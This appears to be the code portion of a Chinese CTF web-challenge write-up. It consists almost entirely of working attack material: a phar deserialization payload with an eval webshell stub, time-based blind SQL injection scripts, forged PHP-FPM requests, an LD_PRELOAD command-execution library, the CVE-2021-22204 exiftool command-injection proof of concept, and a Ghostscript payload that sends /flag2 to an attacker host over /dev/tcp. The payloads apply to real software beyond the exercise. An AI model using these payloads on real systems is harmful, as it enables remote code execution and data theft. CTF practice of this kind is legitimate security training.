    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php eval($_REQUEST[0]);__HALT_COMPILER(); ?>"); //shell放在stub前面
    $phar->setMetadata($poc); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "123"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
    echo urlencode(serialize(file_get_contents("phar.phar")));

}
GET /install.php?ip=127.0.0.1&content=s%3A461%3A%22%3C%3Fphp+eval%28%24_REQUEST%5B0%5D%29%3B__HALT_COMPILER%28%29%3B+%3F%3E%0D%0Az%01%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00D%01%00%00O%3A30%3A%22Nette%5CDatabase%5CTable%5CSelection%22%3A6%3A%7Bs%3A15%3A%22%00%2A%00observeCache%22%3Br%3A1%3Bs%3A13%3A%22%00%2A%00sqlBuilder%22%3BO%3A31%3A%22Nette%5CDatabase%5CTable%5CSqlBuilder%22%3A0%3A%7B%7Ds%3A18%3A%22%00%2A%00accessedColumns%22%3Bs%3A1%3A%221%22%3Bs%3A26%3A%22%00%2A%00previousAccessedColumns%22%3Bs%3A3%3A%22222%22%3Bs%3A18%3A%22%00%2A%00generalCacheKey%22%3Bs%3A17%3A%22%2Ftmp%2Finstall.lock%22%3Bs%3A8%3A%22%00%2A%00cache%22%3BO%3A35%3A%22Nette%5CDI%5CConfig%5CAdapters%5CPhpAdapter%22%3A0%3A%7B%7D%7D%08%00%00%00test.txt%03%00%00%00%8464b%03%00%00%00%D2cH%88%A4%01%00%00%00%00%00%00123%EF.c%C3%26%F0%F2%2F%84B%E6%0B%8E%8B%EC%09k3%E0%BB%02%00%00%00GBMB%22%3B&step=2&action=%E5%AE%89%E8%A3%85 HTTP/1.1
Host: 127.0.0.1:
888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _nss=1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
GET /install.php?type=uri:
phar:///tmp/install.lock/mysql&ip=127.0.0.1&db=mysql&step=1&action=%E5%AE%89%E8%A3%85 HTTP/1.1
Host: 127.0.0.1:
888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://127.0.0.1:
888/install.php
Cookie: _nss=1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
import xlwt
import requests
import time
url="http://IP:
PORT/index.php?id=1%27"
def write_execl(ord_id):
 wb = xlwt.Workbook();
 ws = wb.add_sheet("sheet1")
 ws.write(0,0,ord_id)
 ws.write(0,1,'b')
 ws.write(0,2,'c')
 wb.save("ok.xls")
def sqli():
 flag=''
 sql_str="abcdeflagQWERTYUIOPASDFGHJKLZXCVBNM1234567890-{}"
 for i in range(1,20):
  for s in sql_str:
   startTime=time.time()
   sql_payload="123123' oorr case when(substr((selselectect group_concat(flag) from flag) from {} foorr 1 )='{}') then sleep(5) else 1 end -- a".format(i,s)
   print(sql_payload)
   write_execl(sql_payload)
   file={'file':
open('ok.xls','rb')}
   r=requests.post(url,files=file)
   if time.time()-startTime>4:
    print(s)
    flag=flag+s
    break
 print(flag)
sqli()
<?php
function request_by_curl($remote_server, $post_string) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $remote_server);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $post_string);
  curl_setopt($ch, CURLOPT_USERAGENT, "");
  $data = curl_exec($ch);
  curl_close($ch);
}

function go($func,$args){
  return pack("lllllla*a*", 0, 0, 0, 0, strlen($func), strlen($args), $func, $args);
}
request_by_curl('http://127.0.0.1/index.php', go($_GET['cmd'],$_GET['args']));
?>

# http://127.0.0.1/poc.php?cmd=phpinfo&args=-1
<?php
namespace Ctf{
    class Treeting{
        private $token;
        private $key;
        private $cmd;
        private $args;
        function __construct(){
            $this->token = array(1);
            $this->key = array(2);
            $this->cmd = "var_dumpvar_dump";
            $this->args = base64_encode('2;}eval($_GET[0]);/*');
        }
    }
}

namespace{
    $a = new CtfTreeting();
    $poc =  serialize($a);
    $poc = str_replace("T","G",$poc);
    echo urlencode($poc);
    // unserialize($poc);
}
# O%3A12%3A%22Ctf%5CGreeting%22%3A4%3A%7Bs%3A19%3A%22%00Ctf%5CGreeting%00token%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A1%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00key%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00cmd%22%3Bs%3A16%3A%22var_dumpvar_dump%22%3Bs%3A18%3A%22%00Ctf%5CGreeting%00args%22%3Bs%3A28%3A%22Mjt9ZXZhbCgkX0dFVFswXSk7Lyo%3D%22%3B%7D
    #define _GNU_SOURCE
    #include <stdlib.h>
    #include 
    #include <sys/types.h>

__attribute__ ((__constructor__)) void angel (void){
    unsetenv("LD_PRELOAD");
 const char* cmdline = getenv("CMD");
 system(cmdline);
}
<?php
function request_by_curl($remote_server, $post_string) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $remote_server);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $post_string);
  curl_setopt($ch, CURLOPT_USERAGENT, "");
  $data = curl_exec($ch);
  curl_close($ch);
}

function go($func,$args){
  return pack("lllllla*a*", 0, 0, 0, 0, strlen($func), strlen($args), $func, $args);
}
// $poc = <<< EOF
// copy("http://20.1.1.189:
999/1.so","/tmp/1");putenv("CMD=/readflag>/flag");putenv("LD_PRELOAD=/tmp/1");mail("","","","","");readfile('/tmp/flag');
// EOF;
$poc = <<< EOF
putenv("CMD=/readflag>/tmp/flag");putenv("LD_PRELOAD=/tmp/1");mail("","","","","");include('/tmp/flag');
EOF;

request_by_curl('http://127.0.0.1:
888/index.php'.'?0='.$poc, go($_GET['cmd'],$_GET['args']));
?>
GET /poc.php?cmd=unserialize&args=O%3A12%3A%22Ctf%5CGreeting%22%3A4%3A%7Bs%3A19%3A%22%00Ctf%5CGreeting%00token%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A1%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00key%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00cmd%22%3Bs%3A16%3A%22var_dumpvar_dump%22%3Bs%3A18%3A%22%00Ctf%5CGreeting%00args%22%3Bs%3A28%3A%22Mjt9ZXZhbCgkX0dFVFswXSk7Lyo%3D%22%3B%7D HTTP/1.1
Host: 0.0.0.0:
800
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: tracy-session=436e349820; _nss=1; PHPSESSID=3jn67ujcvbcurso8cli2grh670
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
#!/usr/bin/perl
use strict;
use warnings;

my $poc_imgfile = 'notevil.jpg';
my $outfile = 'ant.out';
my $djvumake = "djvumake $poc_imgfile INFO=0,0 BGjp=/dev/null ANTa=$outfile";

sub usage {
    print "POC-CVE-2021-22204n";
    print "Usage $0 <cmd to inject> n";
    print "tNote: if your cmd contains unix special characters use quote!n";
    print "tEG: $0 "curl xxxx.com/script.sh|sh"n";
    print "This poc generates an image file ($poc_imgfile) to be proccessed by vulnerable exiftool.n";
    print "And requires DjVuLibre to be installed and in PATHn";
    print "t See: http://djvu.sourceforge.net/n";
    print "---nn";
}

sub main {
    # search args for cmd to inject
    my $args = join(' ', @ARGV);
    my $cmd = $args || 'curl http://google.com';

    print "[+] Preparing annotation file.n";
    open(FH, '>', $outfile) or die $!;
    while (<DATA>) {
        s/##/$cmd/;
        print FH $_;
    }
    close(FH);

    print "[+] Creating image file with: $djvumake n";
    system($djvumake);

    # remove file
    unlink $outfile;

    print "[+] $poc_imgfile created.n";
}

usage();
main();

__DATA__
(xmp"
".`/bin/bash -c '##'`;#"
import requests

url = "http://eci-???.cloudeci1.ichunqiu.com:
8888/"
convert_url = "/convert"
hack_ip = "vps_ip"
res = requests.session()

get_flag2=f"""<?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <hui><desc>copies (%pipe%/temp/;bash -c 'cat /flag2 > /dev/tcp/{hack_ip}/2333') (r) file showpage 0 quit </desc>  <svg width="1px" height="1px" /> </hui>"""
res.post(url+"/upload",files={"file":
get_flag2})
res.get(url+convert_url)
// 历史最高分
const BestScoreKey = 'BestScore';
// 方格状态和分数
const CellStateKey = 'CellState';

function Storage() {}

function setData(key,value) {
  var data= new FormData();
  data.append('key',key);
  data.append('value',value)
  data.append('function','setData');
  var xhttp = new XMLHttpRequest();
  xhttp.open("POST", "/", false);
  xhttp.send(data);
}

function getData(key) {
  var data= new FormData();
  data.append('key',key);
  data.append('function','getData');
  var xhttp = new XMLHttpRequest();
  xhttp.open("POST", "/", false);
  xhttp.send(data);
  return xhttp.responseText;
}

Storage.prototype.setBestScore = function(bestScore) {
  setData(BestScoreKey, bestScore);
};

Storage.prototype.getBestScore = function() {
  return getData(BestScoreKey);
};

// 存储方格状态和分数
Storage.prototype.setCellState = function({ score, grid }) {
  setData(CellStateKey, JSON.stringify({
      score,
      grid: grid.serialize()
    }));
};

// 获取方格信息
Storage.prototype.getCellState = function() {
  const cellState = getData(CellStateKey);
  return cellState ? JSON.parse(cellState) : null;
};
import requests
import time
import json
import hmac
import hashlib
import base64
import urllib
header = {
    "alg": "SHA256",
    "typ": "JWT",
}

secret_key = 'keyfe7dc29e5e3d3f066e5a8a15ba135259'

def b64_encode(s):
    return base64.b64encode(s)

def b64_decode(s):
    return base64.b64decode(s)

def encode_(secret, header, payload):
    header_json = json.dumps(header,separators=(',', ':'), sort_keys=True)
    segments = []
    segments.append(b64_encode(header_json))
    segments.append(b64_encode(payload))
    msg = '.'.join(segments)
    hm = hmac.new(secret, msg, digestmod=hashlib.sha256) 
    hm_base64 = b64_encode(hm.digest())
    segments.append(hm_base64)
    token = '.'.join(segments)
    return token

def change(source):
    to=''
    for c in source:
        to+='\u00'+hex(ord(c))[2:]
    return to

headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}

url='http://IP:
PORT/'
flag=''
for i in range(1,50):
    left=33
    right=128

    while right-left!=1:
        mid=(left+right)/2
        payload="'^(substr((select/**/binary/**/load_file(0x2f666c6167)),{i},1)>binary/**/{mid})/**/and/**/sleep(2)^'".format(i=i,mid=hex(mid))
        data='{"data":"0'+change(payload)+'"}'
        cookies={
        'BestScore':
urllib.quote(encode_(secret_key,header,data)),
        'CellState':'eyJhbGciOiJTSEEyNTYiLCJ0eXAiOiJKV1QifQ%3D%3D.eyJkYXRhIjoie1wic2NvcmVcIjoxNCxcImdyaWRcIjp7XCJzaXplXCI6NCxcImNlbGxzXCI6W1t7XCJwb3NpdGlvblwiOntcInJvd1wiOjAsXCJjb2x1bW5cIjowfSxcInZhbHVlXCI6XCJQM1wifSx7XCJwb3NpdGlvblwiOntcInJvd1wiOjAsXCJjb2x1bW5cIjoxfSxcInZhbHVlXCI6XCJQMVwifSxudWxsLHtcInBvc2l0aW9uXCI6e1wicm93XCI6MCxcImNvbHVtblwiOjN9LFwidmFsdWVcIjpcIlAyXCJ9XSxbe1wicG9zaXRpb25cIjp7XCJyb3dcIjoxLFwiY29sdW1uXCI6MH0sXCJ2YWx1ZVwiOlwiUDNcIn0sbnVsbCxudWxsLG51bGxdLFtudWxsLG51bGwsbnVsbCxudWxsXSxbe1wicG9zaXRpb25cIjp7XCJyb3dcIjozLFwiY29sdW1uXCI6MH0sXCJ2YWx1ZVwiOlwiUDFcIn0sbnVsbCxudWxsLG51bGxdXX19In0%3D.i1gMALvm9gfZ0D9An5AaPRyusDS54Pcm7gTrpdxkW%2B4%3D'
        }
        
        mid=(left+right)/2
        t1=time.time()
        requests.get(url,headers=headers,cookies=cookies)
        t2=time.time()
        if t2-t1 >1:
            left=mid
        else:
            right=mid
        print left,right
    flag+=chr(right)
    print flag
import requests
import time

headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}

url='http://IP:
PORT/'
flag=''
for i in range(1,50):
    left=33
    right=128

    while right-left!=1:
        mid=(left+right)/2
        t1=time.time()
        payload="(substr((select/**/binary/**/load_file(0x2f666c6167)),{i},1)>binary/**/{mid})/**/and/**/sleep(1)".format(i=i,mid=hex(mid))
        cookies={'BestScore':'eyJhbGciOiJTSEEyNTYiLCJ0eXAiOiJKV1QifQ%3D%3D.eyJkYXRhIjoiMTQifQ%3D%3D.qOpAjZhKzZ8T3N2TYpP3MN5BQm%2FI5icfuEkzVqfqVgw%3D', 'CellState':'eyJhbGciOiJTSEEyNTYiLCJ0eXAiOiJKV1QifQ%3D%3D.eyJkYXRhIjoiMTQifQ%3D%3D.qOpAjZhKzZ8T3N2TYpP3MN5BQm%2FI5icfuEkzVqfqVgw%3D','CellState`,(select/**/{payload})as/**/`a'.format(payload=payload):'eyJhbGciOiJTSEEyNTYiLCJ0eXAiOiJKV1QifQ%3D%3D.eyJkYXRhIjoiMTQifQ%3D%3D.qOpAjZhKzZ8T3N2TYpP3MN5BQm%2FI5icfuEkzVqfqVgw%3D'}
        r=requests.get(url,headers=headers,cookies=cookies)
        t2=time.time()
        if t2-t1 >1:
            left=mid
        else:
            right=mid
        print left,right
    flag+=chr(right)
    print flag
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/2-1653305277.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/10-1653305278.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/6-1653305279.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/3-1653305279.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/7-1653305280.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/0-1653305280.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/0-1653305281.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/1-1653305282.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/10-1653305283.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/10-1653305283.png)